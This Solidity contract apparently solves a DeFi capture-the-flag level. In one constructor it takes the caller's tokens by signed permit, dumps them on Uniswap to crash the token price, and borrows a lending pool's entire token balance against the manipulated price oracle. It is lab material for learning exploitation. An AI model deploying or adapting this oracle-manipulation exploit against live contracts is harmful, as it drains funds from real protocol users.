// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract AttackPuppet_v2 {
    using Address for address;

    address private uniswapRouter;
    address private pool;
    address private weth;
    address private token;
    uint8 private v;
    bytes32 private r;
    bytes32 private s;
    uint private constant POOL_INITIAL_TOKEN_BALANCE = 1000000 * 10 ** 18;

    constructor(
        address _uniswapRouter,
        address _pool,
        address _weth,
        address _token,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) payable {
        uniswapRouter = _uniswapRouter;
        pool = _pool;
        weth = _weth;
        token = _token;
        v = _v;
        r = _r;
        s = _s;

        (, bytes memory data) = token.staticcall(
            abi.encodeWithSignature("balanceOf(address)", msg.sender)
        );
        uint tokenAmount = abi.decode(data, (uint));
        //permit token
        token.functionCall(
            abi.encodeWithSignature(
                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
                msg.sender,
                address(this),
                tokenAmount,
                type(uint).max,
                v,
                r,
                s
            ),
            "Permit failed"
        );
        //transfer token and eth to this contact
        token.functionCall(
            abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                msg.sender,
                address(this),
                tokenAmount
            ),
            "Transfer token to attackContract failed"
        );
        //swap token to eth
        token.functionCall(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                uniswapRouter,
                tokenAmount
            ),
            "Approve to uniswapRouterContract failed"
        );

        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;

        uniswapRouter.functionCall(
            abi.encodeWithSignature(
                "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
                tokenAmount,
                0,
                path,
                address(this),
                type(uint).max
            ),
            "Swap token to eth failed"
        );
        //deposit and approve weth
        uint ethBalance = address(this).balance;
        weth.functionCallWithValue(
            abi.encodeWithSignature("deposit()"),
            ethBalance,
            "Deposit eth failed"
        );
        weth.functionCall(
            abi.encodeWithSignature(
                "approve(address,uint256)",
                pool,
                ethBalance
            ),
            "Approve weth to poolContract failed"
        );
        //borrow token
        pool.functionCall(
            abi.encodeWithSignature(
                "borrow(uint256)",
                POOL_INITIAL_TOKEN_BALANCE
            ),
            "Borrow token failed"
        );
        //transfer token to player
        token.functionCall(
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                msg.sender,
                POOL_INITIAL_TOKEN_BALANCE
            ),
            "Transfer token to player failed"
        );
    }
}
